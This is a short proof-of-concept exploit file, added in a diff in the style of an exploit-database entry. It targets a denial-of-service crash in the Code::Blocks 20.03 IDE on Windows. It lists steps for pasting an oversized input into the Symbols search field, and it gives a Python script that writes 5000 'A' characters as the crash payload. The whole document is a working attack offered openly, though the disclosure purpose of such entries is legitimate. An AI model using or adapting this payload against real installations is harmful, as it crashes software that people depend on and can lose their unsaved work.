@@ -1,0 +1,34 @@
+# Exploit Title: Code Blocks 20.03 - Denial Of Service (PoC) 
+# Vendor Homepage: http://www.codeblocks.org/ 
+# Software Link Download: https://sourceforge.net/projects/codeblocks/files/Binaries/20.03/Windows/codeblocks-20.03-setup.exe/download
+# Exploit Author: Paras Bhatia
+# Discovery Date: 2020-06-23
+# Vulnerable Software: Code Blocks
+# Version: 20.03
+# Vulnerability Type: Denial of Service (DoS)
+# Tested on: Windows 7 Ultimate Service Pack 1 (32 bit - English)  
+
+#Steps to Produce the Crash:
+
+#   1.- Run python code: CodeBlocksCrash.py
+#   2.- Copy content to clipboard
+#   3.- Open "codeblocks.exe"
+#   4.- In the "Management" section on left hand side, Click on "FSymbols" tab.
+#   5.- Select "Active project's symbols" from drop down "View:" menu.
+#   6.- Paste ClipBoard into the "Search:" field.
+#   7.- Press Enter from keyboard.
+#   8.- Crashed.
+
+
+##################################################################################################################################################
+
+
+#Python "CodeBlocksCrash.py" Code:
+
+f= open("CodeBlocksCrash.txt", "w")
+
+payload="\x41" * 5000
+
+f.write(payload)
+
+f.close()
